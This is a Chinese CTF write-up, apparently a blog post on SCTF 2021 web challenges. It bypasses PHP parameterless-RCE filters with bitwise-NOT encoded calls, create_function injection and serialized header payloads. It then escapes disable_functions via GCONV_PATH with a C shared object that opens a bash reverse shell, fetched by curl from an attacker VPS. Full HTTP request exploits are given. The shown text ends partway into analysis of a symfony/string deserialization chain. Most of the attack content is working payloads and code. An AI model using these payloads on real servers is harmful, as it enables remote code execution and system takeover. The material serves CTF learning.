<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数),</span><br><span class="line">getenv 可以用来收集信息(phpinfo页面)，实际利用一般无法达到命令执行效果，因为默认的 php.ini 中， variables_order 值为： GPCS</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">cmd=var_dump(getenv(phpinfo()));</span><br></pre></td></tr></table></figure>



<p>对于取反,这里做点测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> urlencode(~<span class="string">&quot;system&quot;</span>);</span><br><span class="line">%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span></span><br><span class="line">    </span><br><span class="line">php &gt; <span class="keyword">echo</span> urlencode(~<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span></span><br><span class="line">    </span><br><span class="line">php &gt; (~urldecode(<span class="string">&quot;%8C%86%8C%8B%9A%92&quot;</span>))(~urldecode(<span class="string">&quot;%88%97%90%9E%92%96&quot;</span>));</span><br><span class="line">desktop-n4q9tbd\xxxx</span><br><span class="line">    </span><br><span class="line">php &gt; [~urldecode(<span class="string">&quot;%8C%86%8C%8B%9A%92&quot;</span>)][!urldecode(<span class="string">&quot;%ff&quot;</span>)](~urldecode(<span class="string">&quot;%88%97%90%9E%92%96&quot;</span>));</span><br><span class="line">desktop-n4q9tbd\xxxx</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">我们可以(&quot;system&quot;)(&quot;whoami&quot;)执行命令,但是这样绕不过无参rce</span></span><br><span class="line"><span class="comment">所以我们必须以这种形式 [&quot;system&quot;][0](&quot;whoami&quot;) 提交payload</span></span><br><span class="line"><span class="comment">但是有一点注意:eval不能这么调用,[&quot;eval&quot;][0](&quot;echo 1;&quot;)是错误的</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>所以getenv()这里我们可以构造payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=[~%89%9E%8D%A0%9B%8A%92%8F][!%ff]([~%98%9A%8B%9A%91%89][!%ff]([~%8F%97%8F%96%91%99%90][!%ff]()));</span><br><span class="line"></span><br><span class="line">cmd=[var_dump][0]([getenv][0]([phpinfo][0]()));</span><br></pre></td></tr></table></figure>

<p>成功拿到phpinfo页面</p>
<p><img src="2021122621/image-20211227155908367.png" alt="image-20211227155908367"></p>
<p>然而getenv()一般并不能rce,只能找其他方法</p>
<p>上面说了<code>eval(end(getallheaders()));</code>这个由于eval()不能像[‘eval’][0]这样调用,所以我们要另寻他法</p>
<p>又发现create_function()函数没有被禁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">关于该函数利用简单如下</span><br><span class="line"></span><br><span class="line">create_function(&#x27;$name&#x27;,&#x27;echo $name.&quot;A&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">1. $action($arg,&#x27;&#x27;);</span><br><span class="line">2. $action(&#x27;&#x27;,$str);</span><br><span class="line">以上代码子在变量都可控时有可能造成rce</span><br><span class="line">这里控制$action为 create_function</span><br><span class="line"></span><br><span class="line">关于第一种可以传入</span><br><span class="line">$arg = &quot;)&#123;&#125;phpinfo();/*&quot;;</span><br><span class="line"></span><br><span class="line">第二种可以传入</span><br><span class="line">$str = &quot;2;&#125;phpinfo();/*&quot;;</span><br></pre></td></tr></table></figure>

<p>且call_user_func函数也没有被禁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call_user_func传参只能是多参数 像call_user_func(回调函数,参数,参数)</span><br><span class="line">或者是call_user_func(...[数组(包含了回调函数,参数,参数)])像这样</span><br><span class="line"></span><br><span class="line">比如:</span><br><span class="line">$a = array(&quot;create_function&quot;,&quot;&quot;,&quot;echo 123;&#125;eval($_GET[a]);/*&quot;);</span><br><span class="line">call_user_func(...$a);</span><br><span class="line">上面可以实现getshell</span><br></pre></td></tr></table></figure>

<p>现在我们有call_user_func,create_function,getallheaders,end等函数没有被禁</p>
<p>下面开始payload构造:</p>
<p>这里直接给出思路</p>
<p>我们利用end(getallheaders())可以获得http头的最后一个值</p>
<p>然而call_user_func需要的参数是一个数组,此时我们可以利用php的反序列化</p>
<p>我们在http头里放一段<strong>数组</strong>的序列化代码,利用end(getallheaders())拿到它,再利用unserialize()对其进行反序列化,再传入call_user_func即可实现getshell</p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=phpinfo(); HTTP/1.1</span><br><span class="line">Host: 124.70.199.17:8001</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 346</span><br><span class="line">Host1: a:3:&#123;i:0;s:15:&quot;create_function&quot;;i:1;s:0:&quot;&quot;;i:2;s:27:&quot;echo 123;&#125;eval($_GET[a]);/*&quot;;&#125;</span><br><span class="line"></span><br><span class="line">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">cmd=call_user_func(...unserialize(end(getallheaders())));</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="2021122621/image-20211228130236802.png" alt="image-20211228130236802"></p>
<p>putenv没有被禁</p>
<p>可以利用iconv来绕过disable_function</p>
<p>先在在<code>/tmp</code>目录下上传一个<code>gconv-modules</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2</span><br><span class="line">module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2</span><br></pre></td></tr></table></figure>

<p><code>payload.c</code>文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx/8889 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译后在<code>/tmp</code>目录下上传payload.so</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc payload.c -o payload.so -shared -fPIC</span><br></pre></td></tr></table></figure>

<p>代码执行以下代码触发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;GCONV_PATH=/tmp&quot;);highlight_file(&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;);</span><br></pre></td></tr></table></figure>



<p>为了完成以上操作,要用到php的两个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);可用于下载文件</span><br><span class="line">SplFileObject::fwrite()函数是PHP中的标准PHP库(SPL)的内置函数，用于写入文件</span><br></pre></td></tr></table></figure>

<p>分别把两个文件上传上去,vps监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url=&quot;http://101.43.35.153/payload.so&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);$output = curl_exec($ch);$a = new SplFileObject(&quot;/tmp/payload.so&quot;,&quot;w&quot;);$a-&gt;fwrite($output);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url=&quot;http://101.43.35.153/gconv-modules&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);$output = curl_exec($ch);$a = new SplFileObject(&quot;/tmp/gconv-modules&quot;,&quot;w&quot;);$a-&gt;fwrite($output);</span><br></pre></td></tr></table></figure>

<p>执行以下代码触发反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;GCONV_PATH=/tmp&quot;);highlight_file(&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;);</span><br></pre></td></tr></table></figure>



<p>这里搭个docker环境</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AntSwordProject/AntSword-Labs.git</span><br><span class="line">cd AntSword-Labs/bypass_disable_functions/9</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps # docker id</span><br><span class="line">docker cp index.php 22a37351feac:/var/www/html/index.php</span><br></pre></td></tr></table></figure>

<p>vps部署好相关文件</p>
<p><img src="2021122621/image-20220103112050066.png" alt="image-20220103112050066"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /?a=phpinfo(); HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:18080</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 175</span></span><br><span class="line"><span class="string">rxxx: a:3:&#123;i:0;s:15:&quot;create_function&quot;;i:1;s:0:&quot;&quot;;i:2;s:27:&quot;echo 123;&#125;eval($_GET[a]);/*&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /?a=$url=&quot;http://vpsip/payload.so&quot;;$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);$output=curl_exec($ch);$a=new+SplFileObject(&quot;/tmp/payload.so&quot;,&quot;w&quot;);$a-&gt;fwrite($output); HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:18080</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 175</span></span><br><span class="line"><span class="string">rxxx: a:3:&#123;i:0;s:15:&quot;create_function&quot;;i:1;s:0:&quot;&quot;;i:2;s:27:&quot;echo 123;&#125;eval($_GET[a]);/*&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /?a=$url=&quot;http://vpsip/gconv-modules&quot;;$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);$output=curl_exec($ch);$a=new+SplFileObject(&quot;/tmp/gconv-modules&quot;,&quot;w&quot;);$a-&gt;fwrite($output); HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:18080</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 175</span></span><br><span class="line"><span class="string">rxxx: a:3:&#123;i:0;s:15:&quot;create_function&quot;;i:1;s:0:&quot;&quot;;i:2;s:27:&quot;echo 123;&#125;eval($_GET[a]);/*&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">POST /?a=putenv(&quot;GCONV_PATH=/tmp&quot;);highlight_file(&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;); HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:18080</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 175</span></span><br><span class="line"><span class="string">rxxx: a:3:&#123;i:0;s:15:&quot;create_function&quot;;i:1;s:0:&quot;&quot;;i:2;s:27:&quot;echo 123;&#125;eval($_GET[a]);/*&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>getshell</p>
<p><img src="2021122621/image-20220103112550814.png" alt="image-20220103112550814"></p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">取反getshell</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10212">无参rce</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10057">disable_function绕过</a></p>
<p><a target="_blank" rel="noopener" href="https://eastjun.top/2021/10/20/bypass_disable_function/">iconv绕过disable_func</a></p>
<h2 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload_it"></a>Upload_it</h2><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;../vendor/autoload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;/tmp/sandbox&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    @mkdir(UPLOAD_PATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_user_upload_dir</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$md5_dir</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . session_id());</span><br><span class="line">    <span class="variable">$upload_path</span> = UPLOAD_PATH . <span class="string">&quot;/&quot;</span> . <span class="variable">$md5_dir</span>;</span><br><span class="line">    @mkdir(<span class="variable">$upload_path</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>] = <span class="variable">$upload_path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>])) &#123;</span><br><span class="line">    make_user_upload_dir();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$upload_file_path</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">            <span class="variable">$upload_file</span> = <span class="variable">$upload_file_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$upload_file_path</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>];</span><br><span class="line">            <span class="variable">$upload_file</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$upload_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;OK! Your file saved in: &quot;</span> . <span class="variable">$upload_file</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;emm...Upload failed:(&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too big!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;CODE</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Upload&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Upload files casually XD&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">            FILE: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">            PATH: &lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h3&gt;or...Just look at the phpinfo?&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;./index.php?phpinfo=1&quot;&gt;go to phpinfo&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">CODE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以控制文件生成的路径,造成任意文件覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># composer.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;sctf2021/upload&quot;,</span><br><span class="line">    &quot;authors&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;AFKL&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;upload@qq.com&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;symfony/string&quot;: &quot;^5.3&quot;,</span><br><span class="line">        &quot;opis/closure&quot;: &quot;^3.6&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这题难度不大,都是考的php必备的基础知识</p>
<p>漏洞点在题目环境中的symfony/string依赖中,所以我们首先打开命令行输入<code>composer install</code>配置好环境</p>
<p>主要思路:构造反序列化链生成session文件,再将此文件利用文件上传覆盖题目环境中的session文件,再次带着cookie访问index.php触发反序列化造成命令执行</p>
<p>分析如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./vendor/symfony/string/LazyString.php</span></span><br><span class="line"><span class="comment"># 截取部分代码</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (\is_string(<span class="keyword">$this</span>-&gt;value)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value = (<span class="keyword">$this</span>-&gt;value)();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在该文件的魔术方法__toString()中存在一个函数名可控的函数执行<code>($this-&gt;value)();</code></p>
<p>本来这个地方只能打打phpinfo页面造成信息泄露而并没有很大的危害</p>
<p>但是题目环境中还引入了一个依赖<code>opis/closure</code>,使得它能通过反序列化后执行闭包函数造成命令执行</p>
